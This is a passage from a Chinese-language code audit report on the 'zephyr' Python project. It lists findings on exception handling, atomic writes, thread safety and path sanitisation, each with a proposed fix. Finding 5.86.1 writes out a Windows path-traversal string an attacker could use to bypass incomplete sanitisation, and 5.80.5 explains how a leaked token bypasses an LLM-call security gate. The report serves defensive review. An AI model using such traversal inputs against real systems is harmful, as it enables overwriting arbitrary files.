- **证据**：`__exit__` 中 `self.flush()` 无try/except保护。`flush()` 执行sqlite3连接+`BEGIN IMMEDIATE`+`executemany`，内部异常会重新抛出。若with块内已发生异常，`flush()`的DB异常会掩盖原始异常。
- **修复**：`__exit__`中对flush()做try/except并记录但不掩盖原异常。

#### 5.73.3 [MEDIUM] SkillFileLock.acquire的finally中os.close(fd)可抛异常导致锁文件永不清理

- **文件**：`src/zephyr/autonomy_core/skill_locking.py:122-127`
- **证据**：`os.close(fd)` 未被try/except包裹。若 `os.close` 抛出 `OSError`（如fd已失效），后续 `path.unlink` 不会执行，留下僵尸锁文件，导致后续所有同名锁获取超时失败。`unlink` 有保护但 `close` 没有，防护不对称。
- **修复**：`os.close(fd)` 也用try/except包裹。

#### 5.73.4 [MEDIUM] DatabaseManager.__exit__路径中wal_checkpoint_truncate()未做异常隔离

- **文件**：`src/zephyr/governance/database_manager.py:757-758,574`
- **证据**：`close()` 内部（L572-581）`wal_checkpoint_truncate()`（L574）未被try/except包裹（对比 `conn.close()` 有保护）。若WAL checkpoint抛异常（磁盘满/DB损坏），会掩盖with块原始异常并中断连接池清理流程，导致连接泄漏。
- **修复**：`wal_checkpoint_truncate()` 用try/except包裹。

#### 5.73 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 4 | 5.73.1/5.73.2/5.73.3/5.73.4 |
| **合计** | **4** | |

---

### 5.74 文件系统原子性（4个，第16轮新增）

#### 5.74.1 [HIGH] zombie_scanner直接open(path,"w")非原子写入patterns文件

- **文件**：`src/zephyr/trading/zombie_scanner.py:115-116`
- **证据**：直接以 `"w"` 模式写目标文件，未使用tmp+os.replace原子模式。进程在 `json.dump` 中途崩溃时，patterns文件被截断为半写入状态，下次读取时解析失败返回空dict，丢失全部僵尸进程检测基线。项目已有规范 `shared/io/file_utils.py:atomic_write` 却未使用。
- **修复**：使用 `atomic_write`（tmp+fsync+os.replace）。

#### 5.74.2 [HIGH] reconciler非原子写入YAML配置文件

- **文件**：`src/zephyr/behavioral_audit/reconciler.py:271-272`
- **证据**：直接覆盖写入项目YAML配置文件（如service_layer_owners.yaml）。先读原内容做 `content.replace` 再回写。在 `fh.write` 中途中断时配置文件被破坏为半写入状态，影响整个治理层配置。
- **修复**：使用 `atomic_write`。

#### 5.74.3 [MEDIUM] results_writer非原子写入benchmark JSONL结果

- **文件**：`src/zephyr/intelligence/model_profiling/results_writer.py:60-64`；副本 `pipeline_routing/results_writer.py:60`
- **证据**：直接 `"w"` 写入。中断后产生截断的JSONL文件，`load_benchmark_history` 逐行 `json.loads` 时会在损坏行抛异常。
- **修复**：使用 `atomic_write`。

#### 5.74.4 [MEDIUM] 多处tmp+os.replace实现遗漏fsync，持久化保证不完整

- **文件**：`src/zephyr/behavioral_audit/tamper_proof_audit.py:219-236`；`governance/__main__.py:169`；`governance/audit_trail/writer.py:46`
- **证据**：审计日志写入用tmp+os.replace（原子性好），但写完tmp后未 `f.flush()` + `os.fsync()` 即 `os.replace`。系统崩溃时tmp内容可能仍在页缓存未落盘，replace后目标文件存在但内容为空/不完整。作为"防篡改审计"日志，丢失记录破坏审计完整性。对比规范实现 `shared/io/file_utils.py:113-114` 有flush+fsync。
- **修复**：os.replace前添加 `f.flush(); os.fsync(f.fileno())`。

#### 5.74 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.74.1/5.74.2 |
| MEDIUM | 2 | 5.74.3/5.74.4 |
| **合计** | **4** | |

---

### 5.75 子进程返回码检查（4个，第16轮新增）

#### 5.75.1 [HIGH] tamper_proof_audit git add/commit未检查返回码，committed_to_git被错误置True

- **文件**：`src/zephyr/behavioral_audit/tamper_proof_audit.py:246-265`
- **证据**：两次 `subprocess.run` 均未用 `check=True` 也未检查 `returncode`。git add/commit失败（pre-commit hook拒绝、合并冲突、签名失败）时返回非零但不抛异常，代码仍执行 `record.committed_to_git = True`（L265）。**防篡改审计日志谎报已提交git，破坏审计完整性的核心保证**。攻击者只需让git commit失败即可让审计"假装"已固化。
- **修复**：添加 `check=True` 或检查returncode，失败时不置 `committed_to_git=True`。

#### 5.75.2 [MEDIUM] trigger_router cleanup子进程失败仅上报不处理

- **文件**：`src/zephyr/trading/orchestrator/trigger_router.py:667-679`
- **证据**：未用 `check=True`。子脚本失败（非零退出）时，handler仍返回正常dict（仅透传exit_code），调用方无法区分成功/失败。失败被静默吞没，drafts归档未执行但系统认为handler已成功调度。
- **修复**：检查returncode，失败时返回错误状态。

#### 5.75.3 [MEDIUM] ide_health_daemon多个git子进程未检查返回码

- **文件**：`src/zephyr/trading/ide_health_daemon.py:381-393`
- **证据**：未检查 `r.returncode`。若git不可用/非git仓库，`r.stdout` 为空，metrics静默报0，drift健康监测误判为"无变更/无stash"，可能错过真实漂移告警。对比 `gpu_monitor.py:47` 正确检查 `result.returncode != 0`。
- **修复**：检查returncode，非零时记录warning并标记metrics为不可用。

#### 5.75.4 [MEDIUM] ide_health_daemon cleanup_stash子进程未检查返回码

- **文件**：`src/zephyr/trading/ide_health_daemon.py:412-416`
- **证据**：未用 `check=True`，未检查返回码。`except Exception`（L417）仅捕获 `TimeoutExpired` 等异常，子脚本非零退出被静默忽略。stash清理失败时无任何告警，stash持续堆积。
- **修复**：检查returncode，失败时记录warning。

#### 5.75 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.75.1 |
| MEDIUM | 3 | 5.75.2/5.75.3/5.75.4 |
| **合计** | **4** | |

---

### 5.76 异常层级与捕获广度（4个，第16轮新增）

#### 5.76.1 [HIGH] PipelineError存在3个同名但基类不同的重复定义，破坏异常捕获语义

- **文件**：`src/zephyr/shared/foundation/errors.py:105`（`class PipelineError(ZephyrBaseError)`）；`src/zephyr/signal_fundamental/pipeline.py:79`（`class PipelineError(Exception)`）；`src/zephyr/shared/_cross_layer/ml_experiment_pipeline.py:83`（`class PipelineError(Exception)`）
- **证据**：三个 `PipelineError` 同名但继承不同基类。代码 `from zephyr.shared.foundation.errors import PipelineError` 后写 `except PipelineError`，**无法捕获** `signal_fundamental.pipeline` 抛出的 `PipelineError`（二者是不同类）。异常处理失效——捕获方以为已覆盖所有PipelineError，实则只覆盖规范基类分支。
- **修复**：统一使用 `shared/foundation/errors.py` 的定义，删除其他副本。

#### 5.76.2 [MEDIUM] verdict_engine用except Exception将编程bug伪装为RED判决

- **文件**：`src/zephyr/trading/verdict_engine.py:345-351`
- **证据**：`except Exception as exc:` 把 `AttributeError`/`TypeError`/`KeyError` 等编程bug一律转为RED判决。虽然reason里保留了exc信息，但bug被降级为"红色判决"而非显式失败，在交易判决引擎中可能掩盖代码缺陷导致错误的交易阻断/放行决策。
- **修复**：区分 `TimeoutError`（预期）与编程错误（应让其传播或单独告警）。

#### 5.76.3 [MEDIUM] vector_memory_server用except Exception把所有异常转为error dict，掩盖编程bug

- **文件**：`src/zephyr/infrastructure/vector_memory_server.py:192-193`
- **证据**：`_vms.write` 的编程错误（`AttributeError`/`KeyError`/`TypeError`）被一律包装成 `{"error": str(e), "written": False}` 返回给调用方。调用方无法区分"预期业务错误"与"代码bug"，缺陷在生产中被静默吞没而非暴露崩溃。
- **修复**：捕获VMS自定义异常，让编程错误传播。

#### 5.76.4 [LOW] DispatchError为死异常类——定义且文档声明用途但全代码库从未raise

- **文件**：`src/zephyr/ops/alert_dispatcher.py:92-93`
- **证据**：全代码库搜索 `raise DispatchError` 返回0处匹配。`AlertDispatcher.dispatch` 的try/except从不抛出它。ERROR_CONTRACT文档声明其用于"任务创建失败/DB不可用"，但实现未兑现，调用方若 `except DispatchError` 永远不会命中，造成虚假的错误处理承诺。
- **修复**：在dispatch失败时raise DispatchError，或删除死类。

#### 5.76 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.76.1 |
| MEDIUM | 2 | 5.76.2/5.76.3 |
| LOW | 1 | 5.76.4 |
| **合计** | **4** | |

---

### 5.77 信号处理与进程生命周期（5个，第16轮新增）

#### 5.77.1 [HIGH] import zephyr时启动daemon Timer线程执行monkey-patch

- **文件**：`src/zephyr/__init__.py:125-127,142-144`
- **证据**：`import zephyr` 即创建并启动2个 `threading.Timer`（daemon=True）。`_deferred_bootstrap` 调用 `auto_bootstrap()` 进行全局monkey-patch；由于 `daemon=True`，若主进程在0.05s内退出，bootstrap可能被中途杀死，留下半完成的patch状态。无任何join/cleanup机制。（交叉参考5.79 导入副作用维度）
- **修复**：将bootstrap延迟到显式调用，或添加atexit cleanup。

#### 5.77.2 [MEDIUM] TaskQueue.stop_polling()不join守护线程，最长残留300s

- **文件**：`src/zephyr/infrastructure/queue/task_queue.py:106-115`
- **证据**：`stop_polling()` 仅置 `_running=False`，未调用 `self._thread.join()`。`_poll_loop` 在 `time.sleep(self._config.poll_interval_s)`（默认300s）中阻塞，stop后线程最长存活5分钟。若dispatch handler中途执行则可能继续修改 `_items` 状态。daemon=True时进程退出可被强杀，留下 `item.status=RUNNING` 的半成品任务。
- **修复**：stop_polling后join(timeout=合理值)。

#### 5.77.3 [MEDIUM] MCPProcessPool.stop_zombie_scanner()不join守护线程

- **文件**：`src/zephyr/shared/infra/process_pool.py:197-209`
- **证据**：与5.77.2同模式。`_zombie_scan_loop` 内 `time.sleep(self._zombie_check_interval)`（默认60s），stop后线程仍可能执行一次 `_reap_zombies()` 调用 `_remove_entry()` 修改共享 `_pool` 字典，与外部的并发使用产生竞态。
- **修复**：stop后join(timeout)。

#### 5.77.4 [MEDIUM] guard_loop()内部注册atexit，重复调用累积handler

- **文件**：`src/zephyr/behavioral_audit/resource_guard.py:219-233`；副本 `governance/drift_detection/resource_guard.py:160-172`
- **证据**：`atexit.register(_cleanup)` 在 `guard_loop` 函数体内（非模块级），每次调用 `guard_loop()` 都会注册一个新的 `_cleanup` 闭包到atexit链；多次启动/停止会导致atexit handler累积，进程退出时被重复调用。
- **修复**：改为模块级一次性注册或加 `_atexit_registered` 守卫。

#### 5.77.5 [LOW] InterruptGuard在非主线程静默失败后无兜底

- **文件**：`src/zephyr/infrastructure/auto_fix_engine/interrupt_guard.py:48-59`
- **证据**：模块声明 `[INVARIANTS] SIGINT/SIGTERM MUST触发WAL恢复;零"半修复"状态`，但在非主线程场景下 `install_handlers` 仅warning即返回，`_handlers_installed` 保持False，后续 `begin_fix` 仍会写WAL，但SIGINT到来时无handler触发rollback，违反"零半修复"不变式。无atexit兜底注册。
- **修复**：非主线程时注册atexit作为兜底。

#### 5.77 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.77.1 |
| MEDIUM | 3 | 5.77.2/5.77.3/5.77.4 |
| LOW | 1 | 5.77.5 |
| **合计** | **5** | |

---

### 5.78 装饰器正确性（3个，第16轮新增）

#### 5.78.1 [MEDIUM] async_limited装饰器未使用@functools.wraps，缺失__wrapped__

- **文件**：`src/zephyr/shared/infra/limiter.py:186-195`；副本 `shared/infra_06/limiter.py:182-191`
- **证据**：手动设置 `__name__/__qualname__/__doc__`，但未设置 `__wrapped__`、`__module__`、`__annotations__`、`__dict__`。`inspect.signature(wrapper)` 无法穿透到原函数签名（无 `__wrapped__`），类型检查器看到的签名是 `(*args, **kwargs)` 而非真实参数；pytest等工具按签名注入fixture时失败。
- **修复**：改为 `@functools.wraps(func)`。

#### 5.78.2 [LOW] princpled_check装饰器对原函数产生副作用mutation

- **文件**：`src/zephyr/behavioral_audit/architecture_principles.py:80-87`；副本 `governance/architecture_governance/architecture_principles.py:84-91`
- **证据**：在返回wrapper之前对入参 `func` 直接setattr `func._zephyr_principles = list(principles)`，这是被装饰原函数的副作用。若同一函数对象被多个装饰器链式处理或被外部引用，`func._zephyr_principles` 会污染原对象。属性应挂在wrapper上。
- **修复**：`wrapper._zephyr_principles = ...` 而非 `func._zephyr_principles = ...`。

#### 5.78.3 [LOW] must/should装饰器mutate原函数

- **文件**：`src/zephyr/governance/behavioral_admission/vibe_coding_enforcer.py:62-64,80-82`
- **证据**：与5.78.2同模式，`func._vibe_rule` 与 `func._vibe_level` 设置在原函数上而非wrapper上。由于 `@wraps` 会把 `func.__dict__` 复制到wrapper，行为目前"恰好工作"，但原函数对象被污染，且若原函数已被其他装饰器包装，属性会写到错误的层。
- **修复**：属性设置在wrapper上。

#### 5.78 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 1 | 5.78.1 |
| LOW | 2 | 5.78.2/5.78.3 |
| **合计** | **3** | |

---

### 5.79 导入副作用（4个，第16轮新增）

> 注：S-5（import zephyr启动daemon Timer线程）与5.77.1同源，此处不重复计数。

#### 5.79.1 [HIGH] 模块级os.makedirs在import时执行

- **文件**：`src/zephyr/security/adversarial_validation/injection_engine.py:34`
- **证据**：模块级裸 `os.makedirs("data/red_blue", exist_ok=True)` 调用，`import injection_engine` 即在CWD下创建 `data/red_blue/` 目录。在只读文件系统/受限沙箱中import直接抛 `PermissionError`，整个模块不可用。CWD不同时目录创建位置不可预测。单元测试import该模块会污染测试工作目录。
- **修复**：延迟到 `InjectionEngine.__init__` 或显式 `ensure_dir()` 调用。

#### 5.79.2 [HIGH] game_day_scheduler.py模块级makedirs

- **文件**：`src/zephyr/security/adversarial_validation/game_day_scheduler.py:34`
- **证据**：与5.79.1完全相同的模式，import时强制创建目录。
- **修复**：延迟到首次使用时创建。

#### 5.79.3 [MEDIUM] find_repo_root()在模块级执行.resolve()+.exists()文件系统I/O

- **文件**：`src/zephyr/shared/io/paths.py:42-61`
- **证据**：`REPO_ROOT` 是模块级常量，`import zephyr.shared.io.paths` 即触发 `.resolve()`（解析符号链接，多syscall）+遍历parents逐个 `.exists()`（每个一次stat）。在网络挂载/慢盘上拖慢所有依赖模块的import；找不到标记文件时直接 `FileNotFoundError`，导致所有 `from zephyr... import REPO_ROOT` 的模块级导入链全部失败。
- **修复**：使用 `functools.cache` 延迟计算，或使用环境变量优先。

#### 5.79.4 [LOW] _DIRECTIVE_DIR模块级.resolve()执行符号链接解析I/O

- **文件**：`src/zephyr/shared/api/dos_launcher.py:68-78`；副本 `integration/shared/api_03/dos_launcher.py`
- **证据**：模块级 `.resolve()` 执行符号链接解析I/O。环境变量路径不存在时 `.resolve()` 在非strict模式下仍尝试解析，CWD/挂载异常时可能抛 `OSError`，使整个dos_launcher模块不可导入。
- **修复**：延迟到首次使用时resolve。

#### 5.79 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.79.1/5.79.2 |
| MEDIUM | 1 | 5.79.3 |
| LOW | 1 | 5.79.4 |
| **合计** | **4** | |

---

### 5.80 线程局部与ContextVar清理（5个，第16轮新增）

#### 5.80.1 [HIGH] set_request_id()丢弃ContextVar Token，永不reset

- **文件**：`src/zephyr/shared/utils/context.py:159-163`
- **证据**：`set_context` 返回 `contextvars.Token` 但被显式丢弃。后续无 `reset(token)` 调用，ContextVar在当前上下文中永久持有该RequestContext。asyncio task复用时上一个请求的request_id泄漏到下一个请求；嵌套调用 `set_request_id` 时无法恢复外层上下文。注释"middleware生命周期覆盖整个请求"是错误假设。
- **修复**：保存token并在请求结束时reset。

#### 5.80.2 [HIGH] get_logger()调用session_id_var.set/module_id_var.set不保存token

- **文件**：`src/zephyr/ops/observability/logging.py:253-281`；副本 `shared/observability_02/logging.py`
- **证据**：`get_logger("foo", session_id="sess-A")` 后，当前Context的 `session_id_var` 永久变为 `"sess-A"`。后续在同一async task中调用 `get_logger("bar")`（不传session_id）仍会读到 `"sess-A"`。同模块的 `TraceContext` 上下文管理器正确使用了 `reset(token)`，但 `get_logger` 没有，行为不一致。
- **修复**：使用ContextVar token机制，或改为传参而非set。

#### 5.80.3 [HIGH] grant_allowance()用set()而非reset(token)，破坏嵌套allow_llm_call()

- **文件**：`src/zephyr/security/llm_defense/llm_security/runtime_interceptor.py:133-163`
- **证据**：`_ctx_allowance.set(token)` 返回的Token被丢弃，`revoke_allowance()` 用 `_ctx_allowance.set(None)` 而非 `_ctx_allowance.reset(token)`。嵌套 `with allow_llm_call():` 时，内层 `revoke` 把值设为None，外层 `with` 块内的LLM调用会被错误拦截（外层令牌被内层清理覆盖）。`allow_llm_call` 上下文管理器的 `finally: revoke_allowance()` 不是栈式恢复。
- **修复**：保存token，revoke时用reset(token)。

#### 5.80.4 [MEDIUM] SQLiteMetadataStore.close()仅关闭当前线程的连接，其他线程连接泄漏

- **文件**：`src/zephyr/integration/vector_memory/sqlite_metadata_store.py:113-130,321-324`
- **证据**：`_conn` property 在每个线程首次访问时创建该线程专属的sqlite3.Connection（因 `threading.local`），但 `close()` 只关闭调用线程的 `self._local.conn`。若该store被线程池多线程共享，其他线程的连接永不关闭，造成文件描述符泄漏与SQLite WAL文件锁残留。无 `__del__`、无atexit、无线程枚举清理机制。
- **修复**：追踪所有线程的连接，close时全部关闭。

#### 5.80.5 [MEDIUM] _tls放行令牌无线程退出清理，线程池复用泄漏令牌

- **文件**：`src/zephyr/security/llm_defense/llm_security/runtime_interceptor.py:94-109`
- **证据**：`_tls.allowance` 由 `grant_allowance` 写入，靠 `revoke_allowance` 或 `allow_llm_call` 上下文的 `finally` 清理。但ThreadPoolExecutor中线程被复用：若某任务在 `allow_llm_call()` 块内未正常退出（如BaseException、KeyboardInterrupt跳过finally），`_tls.allowance` 残留到下一个任务，使下一个任务"继承"了上一个任务的LSG放行令牌，绕过RULE-LSG-001安全门控。TTL默认30s内的泄漏窗口真实存在。
- **修复**：任务开始时主动清理thread-local状态。

#### 5.80 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 3 | 5.80.1/5.80.2/5.80.3 |
| MEDIUM | 2 | 5.80.4/5.80.5 |
| **合计** | **5** | |

---

### 5.81 全局状态与单例模式（4个，第17轮新增）

> 维度U：模块级可变全局状态无锁并发访问、Singleton模式无双重检查锁（DCL）

#### 5.81.1 [HIGH] telemetry ring buffer模块级list无锁，后台线程并发修改

- **文件**：`src/zephyr/infrastructure/system_telemetry/facade.py:77-104,180,433`
- **证据**：模块级 `_in_memory_ring`（list）和 `_ring_write_cursor`（int）被后台采集线程写入、被API请求线程读取，无任何锁保护。`_ring_write_cursor` 的 `+= 1` 非原子操作，并发写入导致游标跳跃或回退；`_in_memory_ring[_cursor] = event` 与 `list(_in_memory_ring)` 并发执行时，迭代器可能看到部分写入的元素。CPython GIL不保证复合操作的原子性。
- **修复**：用 `threading.Lock` 保护ring buffer的读写，或改用 `collections.deque(maxlen=...)` 自带线程安全。

#### 5.81.2 [MEDIUM] metrics_bridge Singleton无双重检查锁

- **文件**：`src/zephyr/infrastructure/system_telemetry/metrics_bridge.py:162,168-171`
- **证据**：`instance()` 类方法在多线程同时首次调用时，`if cls._instance is None` 检查后无锁，两个线程可能同时通过检查并各自创建实例。创建后 `_instance` 被后创建的覆盖，先创建的实例泄漏（其内部资源如连接池/线程不会被清理）。非DCL（Double-Checked Locking）模式。
- **修复**：加类级锁 + 双重检查：`if cls._instance is None: with cls._lock: if cls._instance is None: cls._instance = cls()`。

#### 5.81.3 [MEDIUM] context_evictor Singleton无DCL

- **文件**：`src/zephyr/autonomy_core/context_evictor.py:89,96-99`
- **证据**：与5.81.2相同的反模式。`ContextEvictor` 的 `instance()` 无锁保护，多线程并发首次调用时可能创建多个实例。Evictor持有内部状态（如淘汰策略配置、LRU队列），多实例导致淘汰行为不一致。
- **修复**：同5.81.2，加DCL。

#### 5.81.4 [MEDIUM] layer_router get_layer_router()无锁

- **文件**：`src/zephyr/infrastructure/pipeline/layer_router.py:402,405-414`
- **证据**：`get_layer_router()` 全局工厂函数，`global _router; if _router is None: _router = LayerRouter()`，无锁。LayerRouter内部维护路由表（dict），多实例时路由表不一致，请求被分发到错误的层。与5.81.2/5.81.3属同类问题，但此处是模块级函数而非类方法。
- **修复**：加模块级锁 + DCL。

#### 5.81 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.81.1 |
| MEDIUM | 3 | 5.81.2/5.81.3/5.81.4 |
| **合计** | **4** | |

---

### 5.82 迭代器与生成器正确性（1个，第17轮新增）

> 维度V：生成器跨yield持有资源、生成器耗尽后复用

#### 5.82.1 [MEDIUM] behavior_audit_logger生成器跨yield持有文件句柄

- **文件**：`src/zephyr/security/llm_defense/llm_security/behavior_audit_logger.py:341-364`
- **证据**：生成器函数在 `with open(path) as f:` 块内使用 `yield`，当生成器未被完全耗尽（如消费者提前break或发生异常未触发GC），文件句柄不会立即关闭，导致文件描述符泄漏。`f` 的生命周期绑定到生成器的frame，而非with块。若该生成器被传入 `list()` 或 `for` 循环中途break，句柄残留直到GC触发（CPython下可能延迟到下一次循环）。
- **修复**：将文件读取移出生成器，先读完再yield；或使用 `contextlib.closing` + `try/finally` 确保句柄释放。

#### 5.82 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 1 | 5.82.1 |
| **合计** | **1** | |

---

### 5.83 Hash/Equality契约（1个，第17轮新增）

> 维度W：定义__eq__未定义__hash__，对象变unhashable

#### 5.83.1 [MEDIUM] TriggerResult定义__eq__未定义__hash__，变unhashable

- **文件**：`src/zephyr/security/access_control/kill_switch.py:80-100`
- **证据**：`TriggerResult` dataclass定义了 `__eq__` 方法（比较trigger_id和fired_at），但未定义 `__hash__`。Python 3中定义 `__eq__` 会自动将 `__hash__` 设为 `None`，使实例变为unhashable。若 `TriggerResult` 被放入set或用作dict key（如在去重逻辑中），将抛出 `TypeError: unhashable type`。当前代码可能未触发此bug，但契约已破坏，后续使用set/dict时必定出错。
- **修复**：定义 `__hash__`（如 `return hash((self.trigger_id, self.fired_at))`），或用 `@dataclass(frozen=True)` 自动生成。

#### 5.83 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 1 | 5.83.1 |
| **合计** | **1** | |

---

### 5.84 错误路径资源清理（2个，第17轮新增）

> 维度X：异常路径下资源（锁/连接/句柄）未正确释放

#### 5.84.1 [MEDIUM] ordered_lock_acquisition用list.index(lock)清理，重复锁致bug

- **文件**：`src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py:88-95`
- **证据**：`ordered_lock_acquisition` 上下文管理器在 `__exit__` 中用 `self._locks.index(lock)` 找到锁并释放。若 `_locks` 列表中有重复的锁对象（同一Lock实例被add多次），`index()` 返回第一个匹配位置，后续重复锁永远不会被释放，造成死锁。`list.index` 返回的是第一个匹配，而非"当前应该释放的那个"。
- **修复**：用计数器或栈结构追踪获取顺序，而非用 `list.index` 查找。

#### 5.84.2 [LOW] get_market_read_conn contextmanager无try/finally

- **文件**：`src/zephyr/governance/database_service.py:98-102`
- **证据**：`@contextmanager` 装饰的 `get_market_read_conn` 在 `yield conn` 后无 `try/finally`。若消费者在 `with` 块内抛出异常，`yield` 之后的 `conn.close()` 不会执行（`@contextmanager` 在异常时不自动执行yield后的代码，除非有try/finally）。连接泄漏。但该函数可能被 `@contextmanager` 的默认行为部分保护（`@contextmanager` 会在GeneratorExit时执行finally），风险较低。
- **修复**：包裹 `try: yield conn finally: conn.close()`。

#### 5.84 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 1 | 5.84.1 |
| LOW | 1 | 5.84.2 |
| **合计** | **2** | |

---

### 5.85 浅拷贝与可变返回值（4个，第17轮新增）

> 维度Z：方法返回内部可变对象的直接引用，外部可篡改内部状态

#### 5.85.1 [HIGH] cache_layer读返回直接引用，写拷贝，非对称

- **文件**：`src/zephyr/integration/local_model/cache_layer.py:71,84`
- **证据**：`get(key)` 返回 `self._store[key]`（直接引用），`put(key, value)` 存储 `copy.deepcopy(value)`。读写不对称：调用方拿到get返回的对象后修改它，直接篡改了cache内部状态，而cache以为存储的是不可变副本。后续get返回被污染的数据。非对称拷贝是隐蔽的数据完整性bug。
- **修复**：get也返回 `copy.deepcopy(self._store[key])`，或put不拷贝（调用方负责不可变）。

#### 5.85.2 [HIGH] skill_context_isolation restore()返回内部namespace dict引用

- **文件**：`src/zephyr/autonomy_core/skill_context_isolation.py:124`
- **证据**：`restore()` 返回 `self._namespace`（内部dict的直接引用）。调用方可修改返回的dict，直接篡改isolator的内部状态，使后续restore()返回被污染的namespace。隔离机制本身被绕过——"isolation"的语义被破坏。
- **修复**：返回 `dict(self._namespace)` 或 `copy.deepcopy(self._namespace)`。

#### 5.85.3 [MEDIUM] doc_guard_server返回内部carryover dict引用

- **文件**：`src/zephyr/infrastructure/doc_guard_server.py:265,269`
- **证据**：返回 `self._carryover`（内部dict引用）。调用方可修改返回值，篡改server内部carryover状态。carryover用于跨请求传递上下文，被篡改后后续请求可能拿到错误的上下文。
- **修复**：返回 `dict(self._carryover)` 或 `copy.deepcopy(self._carryover)`。

#### 5.85.4 [MEDIUM] work_orchestrator返回内部WorkItem/WorkDAG引用

- **文件**：`src/zephyr/trading/work_orchestrator.py:123-130,63`
- **证据**：`schedule_next()` 返回 `self._items` 中的WorkItem对象引用（非拷贝），`get_dag()` 返回 `self._dag`（内部WorkDAG引用）。调用方修改返回的WorkItem（如改status），直接修改了orchestrator的内部调度状态，可能导致重复调度或跳过。DAG被外部修改后，拓扑排序结果不可预测。
- **修复**：返回拷贝或只读视图（如 `MappingProxyType`）。

#### 5.85 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.85.1/5.85.2 |
| MEDIUM | 2 | 5.85.3/5.85.4 |
| **合计** | **4** | |

---

### 5.86 字符串与路径边界情况（4个，第17轮新增）

> 维度AB：路径净化遗漏反斜杠、null byte、Windows MAX_PATH限制

#### 5.86.1 [HIGH] capability_passport路径净化漏\，Windows路径穿越

- **文件**：`src/zephyr/intelligence/model_profiling/capability_passport.py:255,268,476,488`
- **证据**：路径净化逻辑 `path.replace(":", "_").replace("/", "_")` 将 `:` 和 `/` 替换为下划线，但遗漏了 `\`（反斜杠）。Windows路径分隔符是 `\`，攻击者可构造 `..\..\..\windows\system32` 绕过净化。`capability_passport` 用净化的路径写文件（如passport缓存），路径穿越可覆盖任意文件。
- **修复**：`path.replace(":", "_").replace("/", "_").replace("\\", "_")`，或用 `pathlib.PurePath` 做跨平台净化。

#### 5.86.2 [MEDIUM] runbook_generator文件名净化漏\和null byte

- **文件**：`src/zephyr/behavioral_audit/runbook_generator.py:347`
- **证据**：文件名净化仅替换 `:` 和 `/`，遗漏 `\` 和 `\x00`（null byte）。null byte在Python 3中会导致 `ValueError: embedded null byte`，在C扩展中可能被截断为空字符串（C字符串以null终止）。Windows下 `\` 是路径分隔符，可造成路径穿越。
- **修复**：增加 `.replace("\\", "_").replace("\x00", "")`，或用白名单方式只允许字母数字和 `-_.`。

#### 5.86.3 [MEDIUM] staging_area file_path参数完全未净化

- **文件**：`src/zephyr/trading/staging_area.py:276-277`
- **证据**：`file_path` 参数直接用于文件操作，无任何净化。与5.86.1/5.86.2不同，这里不是"净化不完整"，而是"完全未净化"。`staging_area` 暴露给外部调用方（可能是LLM生成的路径），路径穿越风险最高。
- **修复**：至少做 `os.path.basename(file_path)` 限制为文件名，或用白名单验证。

#### 5.86.4 [LOW] Windows MAX_PATH=260未处理

- **文件**：`src/zephyr/behavioral_audit/drift_infrastructure.py:179,210` + `behavioral_audit/cold_start.py:165,180`
- **证据**：生成的文件路径（如drift报告、冷启动日志）未检查Windows MAX_PATH=260限制。当项目路径较深（如 `D:\ZephyrAlpha\docs\02_enterprise_architecture\...\drift_report_<timestamp>.json`）时，路径长度可能超过260字符，Windows下 `open()` 抛出 `FileNotFoundError`（错误信息误导，实际是路径过长）。非Windows平台无此限制。
- **修复**：检查 `len(path) > 260` 时截断或用 `\\?\` 前缀（Windows长路径支持）。

#### 5.86 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.86.1 |
| MEDIUM | 2 | 5.86.2/5.86.3 |
| LOW | 1 | 5.86.4 |
| **合计** | **4** | |

---

### 5.87 错误链与traceback保全（3个，第18轮新增）

> 维度AC：raise新异常时不带from exc，丢失显式异常链

#### 5.87.1 [MEDIUM] money.py raise MoneyPrecisionError无from exc（trading_contracts副本）

- **文件**：`src/zephyr/trading/trading_contracts/portfolio/contracts/money.py:190-191`
- **证据**：`except Exception as exc: raise MoneyPrecisionError(...)` 未带 `from exc`。Python 3通过 `__context__` 隐式链式，但缺少显式 `__cause__`，traceback显示"During handling..."而非更清晰的"The above exception was the direct cause"。涉及金额转换的敏感路径。
- **修复**：`raise MoneyPrecisionError(...) from exc`。

#### 5.87.2 [MEDIUM] money.py raise MoneyPrecisionError无from exc（shared/contracts副本）

- **文件**：`src/zephyr/shared/contracts/portfolio/money.py:204-205`
- **证据**：与5.87.1完全相同的代码副本，同样缺少 `from exc`。
- **修复**：同5.87.1。

#### 5.87.3 [MEDIUM] task_repo.py raise PostSyncValidationError无from exc

- **文件**：`src/zephyr/governance/task_repo.py:819-820`
- **证据**：`except ValueError as exc: raise PostSyncValidationError(...)` 未带 `from exc`。shlex.split的ValueError通过 `__context__` 隐式保留，但调试时不如显式 `from exc` 清晰。
- **修复**：`raise PostSyncValidationError(...) from exc`。

#### 5.87 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 3 | 5.87.1/5.87.2/5.87.3 |
| **合计** | **3** | |

---

### 5.88 生产代码assert误用（6个，第18轮新增）

> 维度AD：生产代码中用assert做校验，python -O时校验被完全移除。共36处assert语句跨11个文件。

#### 5.88.1 [HIGH] atomic_transaction_manager.py 7处assert检查_conn非None

- **文件**：`src/zephyr/governance/atomic_transaction_manager.py:192,203,333,376,423,454,519`
